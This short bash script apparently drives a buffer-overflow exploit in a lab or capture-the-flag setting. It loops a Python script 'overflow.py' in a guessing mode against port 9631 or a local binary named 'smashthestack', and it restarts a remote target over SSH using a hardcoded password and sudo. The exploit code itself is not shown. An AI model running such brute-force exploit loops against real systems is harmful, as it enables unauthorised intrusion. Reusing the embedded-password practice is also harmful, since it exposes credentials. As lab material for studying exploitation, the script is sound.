#!/bin/bash

script='overflow.py'
test=$1
port=9631
host='0.0.0.0'

while true ; do
  if [ ! "$test" ] ; then
    sshpass -p "john" ssh john@192.168.56.110 'sudo /bin/sh /home/ss.sh'
    timeout --foreground 10s python "${script}" GUESS PORT="${port}" \
    HOST="${host}" 2>/dev/null
  else
    ./smashthestack 2>/dev/null &
    timeout --foreground 10s python "${script}" GUESS 2>/dev/null
  fi
  status=$?
  if [ $status -eq 124 ] || [ $status -eq 0 ] ; then
    exit 0
  fi
done
